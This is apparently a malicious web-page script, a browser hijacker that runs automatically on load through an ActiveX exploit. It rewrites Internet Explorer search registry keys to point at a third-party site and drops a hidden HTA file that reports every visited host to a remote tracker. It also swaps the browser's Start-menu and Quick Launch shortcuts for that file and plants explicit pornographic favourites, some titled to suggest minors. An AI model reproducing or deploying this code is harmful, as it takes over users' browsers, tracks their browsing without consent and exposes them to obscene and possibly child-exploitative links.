
document.write("<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>");
function AddFavLnk(loc, DispName, SiteURL)
{
var Shor = Shl.CreateShortcut(loc + "\\" + DispName +".URL");
Shor.TargetPath = SiteURL;
Shor.Save();
}
function f(){
try
{
a1=document.applets[0];
a1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}");
a1.createInstance();
Shl = a1.GetObject();
a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}");
a1.createInstance();
FSO = a1.GetObject();
a1.setCLSID("{F935DC26-1CF0-11D0-ADB9-00C04FD58A0B}");
a1.createInstance();
Net = a1.GetObject();
try
{
if (document.cookie.indexOf("Chg") == -1) 
{


Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page", "http://www.gallview.com/search/"); 
Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Bar", "http://www.gallview.com/search/");
Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\SearchURL", "http://www.gallview.coms/search/");
Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Default_Search_URL", "http://www.gallview.com/search/");						
Shl.RegWrite("HKCU\\Software\\Microsoft\\Internet Explorer\\Search\\SearchAssistant", "http://www.gallview.com/search/");
Shl.RegWrite("HKLM\\Software\\Microsoft\\Internet Explorer\\Search\\SearchAssistant", "http://www.gallview.com/search/"); 
Shl.RegWrite("HKLM\\Software\\Microsoft\\Internet Explorer\\Search\\CustomizeSearch", "http://www.gallview.com/search/"); 




var WF, Shor, loc, yyy;


WF = FSO.GetSpecialFolder(0);
loc = WF + "\\Application Data\\Microsoft\\Internet Explorer\\Quick Launch";
if(!FSO.FolderExists(loc))
{
loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\Application Data\\Microsoft\\Internet Explorer\\Quick Launch";
if(!FSO.FolderExists(loc))
{
return;
}
}

yyy="<HTML><HEAD> \r";
yyy=yyy + "<HTA:APPLICATION ID=\"oHTA\" \r";
yyy=yyy + "APPLICATIONNAME=\"myApp\" \r";
yyy=yyy + "SINGLEINSTANCE=\"yes\" \r";
yyy=yyy + "WINDOWSTATE=\"minimize\" \r";
yyy=yyy + "showInTaskbar=\"no\"  \r";
yyy=yyy + "/></HEAD><BODY>  \r";
yyy=yyy + "<div id=xxx></div><div id=kkk></div><scr" + "ipt language=\"vbscript\">  \r";
yyy=yyy + "on error resume next  \r";
yyy=yyy + "self.moveto 5000,5000 \r";
yyy=yyy + "set zzz=window.open(\"\") \r";
yyy=yyy + "function vx() \r";
yyy=yyy + "on error resume next \r";
yyy=yyy + "if isobject(zzz) then \r";
yyy=yyy + "if zzz.closed then  \r";
yyy=yyy + "self.close \r";
yyy=yyy + "else \r";
yyy=yyy + "unde=replace(zzz.location.host,\"www.\",\"\") \r";
yyy=yyy + "if unde<>kkk.innerHTML and unde<>\"//\" then \r";
yyy=yyy + "xxx.innerHTML=\"<iframe src='http://www.gallview.com/ad/index.php?host=\" & unde & \"' width=1 height=1></iframe>\" \r";
yyy=yyy + "kkk.innerHTML=unde \r";
yyy=yyy + "end if \r";
yyy=yyy + "end if \r";
yyy=yyy + "else \r";
yyy=yyy + "self.close \r";
yyy=yyy + "end if \r";
yyy=yyy + "end function \r";
yyy=yyy + "setInterval \"vx\",2000 \r";
yyy=yyy + "sub window_onfocus \r";
yyy=yyy + "self.moveto 5000,5000 \r";
yyy=yyy + "self.blur \r";
yyy=yyy + "end sub \r";
yyy=yyy + "</sc" + "ript></BODY></HTML> \r";
yyy=yyy + " \r";
yyy=yyy + " \r";
yyy=yyy + " \r";






var a = FSO.CreateTextFile(FSO.GetDriveName(WF) + "\\Program Files\\Internet Explorer\\\\IEXPLORE.hta",1);
a.Write(yyy);
a.Close();
var Shor = Shl.CreateShortcut(Shl.SpecialFolders("StartMenu") + "\\Programs\\Internet Explorer.lnk");
Shor.TargetPath = FSO.GetDriveName(WF) + "\\Program Files\\Internet Explorer\\IEXPLORE.hta";
Shor.IconLocation = FSO.GetDriveName(WF) + "\\Program Files\\Internet Explorer\\IEXPLORE.EXE,0"
Shor.Save();
var Shor = Shl.CreateShortcut(loc + "\\Launch Internet Explorer Browser.lnk");
Shor.TargetPath = FSO.GetDriveName(WF) + "\\Program Files\\Internet Explorer\\IEXPLORE.hta";
Shor.IconLocation = FSO.GetDriveName(WF) + "\\Program Files\\Internet Explorer\\IEXPLORE.EXE,0";
Shor.Save();



WF = FSO.GetSpecialFolder(0);
loc = WF + "\\Favorites";
if(!FSO.FolderExists(loc)){
	loc = FSO.GetDriveName(WF) + "\\Documents and Settings\\" + Net.UserName + "\\Favorites";
	if(!FSO.FolderExists(loc)){return;}
}
AddFavLnk(loc, "Fuck Me Baby","http://best-sites.ca.tc/");
AddFavLnk(loc, "Blow Job Central","http://blowjob-central.ca.tc");
AddFavLnk(loc, "Teen Pleasures", "http://best-sites.ca.tc/");
AddFavLnk(loc, "Virgin Babes", "http://virgin-babes.ca.tc");
AddFavLnk(loc, "Deep Penetration", "http://best-sites.ca.tc/");
AddFavLnk(loc, "Lolita Pussy", "http://lolita-pussy.ca.tc");
AddFavLnk(loc, "Free Daily Pictures", "http://best-sites.ca.tc/");
AddFavLnk(loc, "Teen Penetration", "http://teen-penetration.ca.tc");
AddFavLnk(loc, "Best Porn Sites", "http://best-sites.ca.tc/");
AddFavLnk(loc, "Hourly Free Web Site", "http://web-site-of-the-hour.ca.tc");
AddFavLnk(loc, "Daily Amateur Gallery", "http://galleries.amateur-pages.com/multi/index.cfm?ID=256578:JPG");
AddFavLnk(loc, "Horny Housewives", "http://best-sites.ca.tc/");




}
}
catch(e)
{}
}
catch(e)
{}
}

function init()
{
setTimeout("f()", 2000);
}
init();
 </script>
</body></html>